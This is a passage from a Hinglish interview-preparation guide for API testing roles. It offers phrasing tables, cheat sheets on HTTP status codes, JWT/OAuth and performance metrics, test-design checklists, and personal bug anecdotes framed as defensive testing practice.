| "I check if status is 200 and the response is not empty" | Ye exactly wo bug miss karta hai jo aapne khud pakda tha | "Status is my weakest assertion. I go status → content type → schema → business values → side effects → non-effects. At Merlin an endpoint returned a clean 200 with `totalPrice: null` for a contract with a real value." |
| "I validate the response using JSON Schema, so data correctness is covered" | Schema shape validate karta hai, truth nahi | "Schema catches structure. It does not catch a nullable field being wrongly null — which is exactly the bug I hit. So above schema I run null-safety walks, arithmetic invariants and round-trip checks." |
| "400 and 422 are basically the same, I just check it's a 4xx" | Careless lagta hai | "400 is syntactic, 422 is semantic. In practice many APIs use 400 for both and that's fine — what I actually test for is consistency and whether the error names the offending field, because inconsistency is what breaks clients." |
| "500 errors are a backend problem, I just report them" | Ownership missing | "Every 5xx is a bug until proven otherwise — no client input should make the server throw. And it's usually two bugs, because the unhandled path is where internals leak. At Merlin a 400 on a public endpoint carried the raw Mongo query and an internal proxy dump." |

## 14.2 Auth

| ❌ Mat bolo | Kyun bura hai | ✅ Ye bolo |
|---|---|---|
| "For auth testing I check that a request without a token returns 401" | Ye 5% coverage hai — sirf authentication | "Authentication is centralised, so it's usually right. Authorization is distributed across every controller and resource, so that's where nearly all real defects are. I drive a role × endpoint matrix, plus object-level ownership tests, because two users with the same role must still not see each other's data." |
| "JWT is secure because it's encrypted" | **Factually wrong** — instant credibility loss | "A JWT is signed, not encrypted. The payload is just base64 — anyone can read it without a secret. So I decode it in a test and assert nothing sensitive is in there. The signature only proves it wasn't tampered with." |
| "I use the same admin token for all my tests" | Authorization test kar hi nahi rahe | "I keep a client per role including a real user in another org — and I get that token by logging in, not by minting it. That last part matters: our backend had 57 passing auth tests that each minted their own token, and the real flow was still broken." |
| "The UI hides the button for viewers, so they can't do it" | Security aur UX confuse kar rahe ho | "Hiding a button is a UX test, not a security test. The endpoint is what an attacker calls. I test the button visibility in the UI and the 403 at the API level — and only the second one is security." |

## 14.3 Test design

| ❌ Mat bolo | Kyun bura hai | ✅ Ye bolo |
|---|---|---|
| "I write positive and negative test cases" | Har koi bolta hai, koi information nahi | "I design against eight dimensions: functional, validation, authorization, business rules, idempotency, concurrency, schema and performance, with security cutting across. For our carve endpoint that's about ninety-five tests, and only four are happy path." |
| "I test all possible combinations" | Impossible, aur judgement ki kami dikhata hai | "I use boundaries and equivalence classes rather than exhaustion — zero, one, exactly the limit, limit plus one, and one representative from each valid class. Exhaustive combinations aren't achievable, so the skill is choosing which ones carry risk." |
| "I use `time.sleep()` to wait for async operations" | Flakiness ka #1 source | "Never a bare sleep — it encodes a timing assumption that differs between a laptop and a loaded CI runner. I poll with exponential backoff, honour `Retry-After`, stop immediately on terminal failure states, and include the last job payload in the timeout message." |
| "My tests run in a specific order because test 2 needs data from test 1" | Design failure | "Every test creates its own data through a factory with teardown in a finalizer, so tests run in any order and in parallel. If a suite fails under parallel execution, that's a signal worth chasing — either shared data or the API is holding state it shouldn't." |
| "I add `assert response is not None` to make sure it worked" | Meaningless assertion | "I assert exact values on data the test created itself, and invariants on data it didn't — sums, ratios, orderings, no unexpected nulls. Those hold regardless of the dataset and still catch real bugs." |

## 14.4 Tooling

| ❌ Mat bolo | Kyun bura hai | ✅ Ye bolo |
|---|---|---|
| "I do API testing in Postman" (aur ruk jaana) | Junior ceiling | "Postman is where I explore and where I run production monitors. Regression suites move to pytest, because collection JSON is unreviewable in a PR diff, there's no clean way to share setup, and I can't spawn a thread pool to prove a race condition is handled." |
| "I test against mocks so the tests are fast and stable" | Yahi wo trap hai jisme frontend fasa tha | "Mocks serve back your own assumptions. Testing a client against a mock proves the client parses the mock — nothing about the real provider. That's precisely how a team ends up with a green suite and a broken integration. Mocks unblock development; contract tests and real integration verify." |
| "I added retries so flaky tests pass" | Bug chhupa rahe ho | "A retry that makes a test pass hides either a product race condition or a bad test. I retry only on genuine infrastructure faults, and I restrict client-level retries to idempotent methods — a retried POST creates duplicate data, and nothing in the output would tell me my own framework caused it." |
| "Playwright can do API testing too, so I'd use it for everything" | Trade-off nahi soch rahe | "I default to pytest and requests for the API suite — lighter, native concurrency, full Python ecosystem. I reach for Playwright's request context when I need the browser's auth state, since our JWT arrives in a cookie, or when I need to intercept the network to test error and loading states." |

## 14.5 Performance

| ❌ Mat bolo | Kyun bura hai | ✅ Ye bolo |
|---|---|---|
| "Average response time is under 500ms, so we're fine" | Average outliers chhupa deta hai | "Averages hide the users you care about. Ninety-five requests at 100ms and five at 5s averages to 345ms, comfortably inside SLA, while one in twenty users waits five seconds. I report p50, p95 and p99, and I watch the p99/p50 ratio because a wide spread is a different problem from being uniformly slow." |
| "The API is slow" (bug report mein) | Actionable nahi | "I quantify, then isolate the layer with curl's timing breakdown — TTFB is server time, total minus TTFB is transfer — then isolate the input dimension, then look at the trace. The report says 'one query plus one per result; at page size 100 that's 101 queries and 2.8 of the 3.2 seconds', with the correlation id." |
| "I ran a load test and it passed" | Correctness assertions missing | "Latency thresholds alone will pass happily while the API returns garbage under contention. My k6 checks assert business invariants too — carved plus remaining still equals the total — because load is exactly when race conditions surface." |

## 14.6 General attitude

| ❌ Mat bolo | ✅ Ye bolo |
|---|---|
| "That's the developer's job" | "I take it to root cause where I can. For that public-endpoint leak I traced it to `findByOrgAndEmailAddress` returning `Optional`, which assumes at most one result, while `(org, emailAddress)` had no uniqueness constraint — so duplicates threw `IncorrectResultSizeDataAccessException`." |
| "We didn't have time to test that" | "I'd say what I chose not to cover and why. Coverage is a set of risk decisions, and stating them explicitly is more useful than implying everything was tested." |
| "I don't know" (aur ruk jaana) | "I haven't worked with that directly. Based on what I know about X, I'd expect it to work like Y — and the first thing I'd test is Z. Is that close?" |
| "The requirements weren't clear" | "Where the spec was silent I wrote the test, documented the observed behaviour as a spec question, and took the list to the PO. Those questions find bugs — asking 'what if two contacts share an email' is what exposed our missing constraint." |
| Kisi ex-colleague ya company ko blame karna | Systems ke baare mein baat karo, logon ke baare mein nahi: "The tests were well-intentioned and thorough within each component — the gap was structural, nobody had a test that crossed the seam." |

## 14.7 Aur teen practical rules

**1. "Never" aur "always" se bacho.** Senior answers mein trade-offs hote hain.
- ❌ "You should always use cursor pagination"
- ✅ "Cursor pagination is stable and fast at depth, but you lose random access and cheap total counts. If the UI needs 'jump to page 47', offset is the honest choice — with a cap on how deep it goes."

**2. Buzzword bolo to example ready rakho.** Agar "contract testing" bolte ho, Pact ka flow
bata paana chahiye. Agar "shift-left" bolte ho, ek concrete cheez batao jo aapne PR se pehle
ki.

**3. Interview ko debug ki tarah treat karo.** Agar sawaal ambiguous hai, ek clarifying
question poochna strong hai, weak nahi:
> "Before I answer — is this a public API with external consumers, or internal service-to-service? My approach to versioning and error detail differs quite a bit between the two."

---

# PART 15 — Quick Revision

Interview se ek ghanta pehle sirf ye padho.

## 15.1 Core concepts — one-liners

| Concept | One-line answer |
|---|---|
| **Safe** | Server state change nahi karta (GET, HEAD, OPTIONS) |
| **Idempotent** | 1 baar ya N baar — **final server state same**. Response alag ho sakta hai |
| **Cacheable** | Response store karke reuse ho sakta hai |
| **Safe ⊃ Idempotent?** | Safe hai to idempotent hai. Ulta nahi (DELETE idempotent, safe nahi) |
| **POST idempotent?** | Spec ke hisaab se nahi. Idempotency-Key ya DB unique constraint se bana sakte ho |
| **PATCH idempotent?** | Payload pe depends. `{"status":"CLOSED"}` haan; `{"$inc":{"qty":1}}` nahi |
| **PUT vs PATCH** | PUT poora resource replace; PATCH partial. PUT mein missing field = hatao |
| **REST** | Architectural style, protocol nahi. 6 constraints. Koi "REST spec" nahi hai |
| **6 constraints** | Client-server, Stateless, Cacheable, Uniform interface, Layered, Code-on-demand (optional) |
| **Richardson levels** | 0 POX → 1 resources → 2 verbs+status (95% APIs) → 3 HATEOAS |
| **HTTP/2 ne kya diya** | Binary framing, multiplexing (1 connection, N streams), HPACK header compression |
| **HTTP/3 ne kya diya** | QUIC over UDP — no TCP head-of-line blocking, TLS in handshake, connection migration |
| **GraphQL errors** | HTTP 200 ke saath `errors[]` array mein — kyunki response **partial** ho sakta hai |
| **N+1** | 1 parent query + N child queries. GraphQL mein query shape se trigger |
| **SOAP vs REST** | SOAP = protocol + WSDL + XML + WS-Security; REST = style + JSON + HTTP semantics |

## 15.2 Status codes — cheat sheet

| Code | Matlab | QA note |
|---|---|---|
| **200** | OK | Body sach mein sahi hai? Empty result = 200, 404 nahi |
| **201** | Created | **`Location` header hona chahiye** |
| **202** | Accepted (async) | Status URL mila? Kaam sach mein hua? |
| **204** | No Content | Body BILKUL khaali |
| **304** | Not Modified | Body nahi. ETag match |
| **400** | Bad Request | **Syntax** galat. 500 kabhi nahi |
| **401** | Unauthorized | **AuthN** fail. `WWW-Authenticate` chahiye. Client refresh karega |
| **403** | Forbidden | **AuthZ** fail. Retry se fayda nahi |
| **404** | Not Found | Cross-tenant pe **ye sahi choice hai** — existence hide karta hai |
| **405** | Method Not Allowed | `Allow` header chahiye |
| **409** | Conflict | Duplicate, concurrency, state machine violation |
| **412** | Precondition Failed | `If-Match` fail — optimistic locking |
| **413/414/415** | Payload/URI too large, Unsupported media | Limits enforce ho rahe? |
| **422** | Unprocessable | **Semantics** galat (parse ho gaya, business rule fail) |
| **429** | Too Many Requests | **`Retry-After` chahiye** |
| **431** | Headers too large | Fat JWT ka symptom |
| **500** | Internal error | **Har 500 ek bug hai.** Stack trace leak? |
| **502** | Bad Gateway | Gateway se aaya, app se nahi |
| **503** | Unavailable | Retry-After. Deploy/circuit breaker |
| **504** | Gateway Timeout | Round number = proxy timeout. **Kaam hua ho sakta hai!** |

## 15.3 Auth — cheat sheet

| Cheez | Yaad rakho |
|---|---|
| **Basic** | `base64(user:pass)` — encoding, encryption NAHI |
| **JWT parts** | `header.payload.signature`, base64url, `.` se joined |
| **JWT claims** | `iss sub aud exp nbf iat jti` + custom |
| **JWT payload** | **Signed, not encrypted.** Public maano. Secrets mat daalo |
| **Tampering** | Payload badalne se signature mismatch → 401 |
| **`alg: none`** | Classic bypass. Reject hona chahiye |
| **RS256→HS256** | Algorithm confusion — public key ko HMAC secret bana ke sign |
| **Access token** | 5-15 min, har request pe, JWT |
| **Refresh token** | Days, sirf `/refresh` pe, opaque, rotate + reuse detection |
| **OAuth roles** | Resource Owner, Client, Authorization Server, Resource Server |
| **Auth Code flow** | Code browser se, token server-to-server with `client_secret` |
| **Client Credentials** | M2M, koi user nahi, scope-limited |
| **PKCE** | Public clients. `verifier` random, `challenge = S256(verifier)`. Code chori bekaar |
| **Implicit / ROPC** | **Deprecated.** Token URL fragment mein / password app ko diya |
| **Cookie flags** | `HttpOnly` (XSS), `Secure` (HTTPS), `SameSite` (CSRF) |
| **SameSite** | `Strict` / `Lax` (default, top-level GET only) / `None` (needs Secure) |
| **mTLS** | Dono side certificates. Transport-layer auth |

## 15.4 Assertion ladder

```
1. Status code       weakest  — necessary, never sufficient
2. Content-Type      sahi parser?
3. Response headers  security, caching, rate limit
4. Schema            structure + additionalProperties: false (SECURITY)
5. Business values   STRONGEST — value sach mein sahi hai?
6. Side effects      DB / downstream / event mein sahi hua?
7. Non-effects       jo NAHI hona chahiye tha, wo nahi hua?
```

## 15.5 Test design — 8 dimensions

```
1. FUNCTIONAL     happy path + side effects + non-effects
2. VALIDATION     har field x har invalid value, parametrized, boundaries
3. AUTHORIZATION  role x endpoint matrix + object-level (IDOR) + tenant
4. BUSINESS RULES limits, state machine, off-by-one at exact boundary
5. IDEMPOTENCY    same key, different key, timeout+retry
6. CONCURRENCY    2 → 25 parallel, exactly one winner, no over-limit
7. SCHEMA         structure, no leaks, mass assignment
8. PERFORMANCE    p95/p99, N+1 detector, errors under load
+ SECURITY        injection, info disclosure, CSRF, caching (cross-cutting)
```

## 15.6 Framework layers

```
5  CI/CD        smoke → functional+security → contract → can-i-deploy → nightly
4  TESTS        arrange (factory) → act (service) → assert (validators)
3  TEST DATA    builders + API-backed factories with teardown finalizers
2  DOMAIN       BudgetService.carve() — tests never see URLs
1  TRANSPORT    ApiClient: session, retry (IDEMPOTENT ONLY), timeout,
                correlation id, secret redaction, rich failures
```

## 15.7 Performance

| Metric | Yaad rakho |
|---|---|
| **Average** | SLA ke liye **kabhi mat use karo** — outliers chhupa deta hai |
| **p50** | Typical experience |
| **p95** | SLA standard |
| **p99** | Tail — GC, pool contention, cold cache |
| **p99/p50 ratio** | >10x = variable system, alag problem |
| **Tail amplification** | 20 calls, 1% slow each → 18% page loads slow |
| **Little's Law** | Concurrency = Throughput × Latency |
| **TTFB** | Server processing time |
| **Total − TTFB** | Payload transfer time |
| **Soak test** | Memory/connection leaks — 6 ghante mein dikhte hain, 10 min mein nahi |

## 15.8 Aapke [REAL] examples — inhe ratta lagao

| Bug | Ek line mein | Kis topic pe plug karo |
|---|---|---|
| **Info disclosure** | Public unauthenticated endpoint ne HTTP 400 diya jisme **raw Mongo query** thi — org ObjectId aur internal `$java ... LazyLoadingProxy` dump | 5xx/error handling, information disclosure, public endpoints, fuzzing |
| **Root cause** | `findByOrgAndEmailAddress(): Optional<CustomerContact>` — "at most one" assume kiya, lekin `(org, emailAddress)` pe uniqueness constraint nahi tha → duplicates ne `IncorrectResultSizeDataAccessException` throw kiya | Root-cause ownership, data integrity, reading backend code |
| **Null price** | Customer-facing endpoint ne **200 ke saath** `{"totalPrice": null, "lineItems": []}` diya, jabki contract ki real signed value thi. Reader estimate entity dekh raha tha, frozen price **Sale** entity pe thi | "200 but wrong data", schema ki limits, null-safety, empty-collection suspicion |
| **57 tests** | Backend ke 57 passing integration tests (forgery, replay, expiry, cross-org) — phir bhi E2E flow toota tha, kyunki **har test apna token mint karta tha aur apna customerId pass karta tha**. Seams kabhi test nahi hue | Contract testing, integration vs API testing, auth testing, test design |
| **Concurrency pass** | Same scope pe do concurrent carves → **exactly ek 201, ek 409**, DB-level unique partial index se enforced (application check-then-insert se nahi) | Concurrency, 409, idempotency, race conditions, POST idempotency |
| **Multi-tenant** | Org-scoped ERP — har endpoint pe sawaal: header/body/query se org override ho sakta hai? Cross-org pe 404 aana chahiye, 403 nahi | Tenant isolation, 401/403/404, authorization matrix |
| **JWT in cookie** | Auth JWT cookie se aata hai → HttpOnly/Secure/SameSite testable; aur Playwright `page.request` se browser auth state share hoti hai | Cookies, CSRF, Playwright APIRequestContext |

## 15.9 Opening line — ratta lagao

> "At Merlin AI — a construction ERP — I moved from clicking through the UI to testing the API
> layer directly, because most of our real defects were not UI defects. Three examples shaped
> how I test now. One, a public unauthenticated endpoint returned a 400 whose error message
> contained the raw Mongo query, including the org ObjectId and an internal `LazyLoadingProxy`
> dump — information disclosure no UI test would ever surface. Two, a customer-facing endpoint
> returned `totalPrice: null` with an empty line items array, with a 200 status, for a contract
> that had a real signed value — which is why I treat the status code as the weakest assertion
> I can write. Three, the backend had 57 passing integration tests covering token forgery,
> replay, expiry and cross-org access, and the end-to-end flow was still broken, because every
> test minted its own token and passed its own customerId, so the seams were never exercised.
> Those three taught me that API testing is about the response body, the error surface, and the
> integration seams — not about the happy path returning 200."

## 15.10 Closing questions — aap kya poochein

Interviewer ko poochne ke liye — ye aapko senior dikhata hai:

1. "Where does the team currently draw the line between API and UI coverage, and is anyone unhappy with where it sits?"
2. "How do you handle test data — is there an isolation strategy, or do suites share an environment?"
3. "Do you do contract testing between services, or is that gap covered by end-to-end tests today?"
4. "When a production incident happens, does a regression test usually get written for it? Who owns that?"
5. "How much of the API surface is currently covered by an authorization matrix, versus tested ad hoc?"
6. "Is QA involved before the API design is finalised, or after the endpoint is built?"

---

## Final checklist — interview se pehle

```
[ ] Assertion ladder ke 7 layers bol sakta hoon
[ ] 8 test design dimensions bol sakta hoon
[ ] Safe / idempotent / cacheable — exact definitions, aur idempotent ≠ same response
[ ] PUT vs PATCH ka data-loss example bol sakta hoon
[ ] 401 vs 403 vs 404, aur 404 kab SECURE choice hai
[ ] JWT signed hai, encrypted nahi — aur alg:none / RS256→HS256 attacks
[ ] OAuth ke 3 flows: auth code, client credentials, PKCE — aur PKCE kyun
[ ] additionalProperties: false ek SECURITY test kyun hai
[ ] Average kyun jhooth bolta hai, p95/p99 kyun
[ ] Contract testing us bug class ko kyun pakadta hai jahan dono side pass hain
[ ] Retry sirf idempotent methods pe kyun
[ ] Apne 5 [REAL] bugs — bina soche, ek-ek line mein
[ ] Opening line — word for word
[ ] 3 questions poochne ke liye ready
```
